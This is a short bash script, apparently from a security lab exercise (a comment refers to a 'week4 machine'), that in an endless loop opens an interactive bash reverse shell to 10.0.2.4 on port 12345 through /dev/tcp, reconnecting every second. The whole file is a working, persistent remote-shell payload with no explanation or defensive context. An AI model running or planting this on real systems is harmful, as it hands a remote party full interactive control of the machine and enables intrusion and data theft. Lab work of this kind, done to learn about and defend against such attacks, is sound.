# run on week4 machine after running nano reverse_shell.sh
#!/bin/bash
while true; do
    /bin/bash -i >& /dev/tcp/10.0.2.4/12345 0>&1
    sleep 1
done
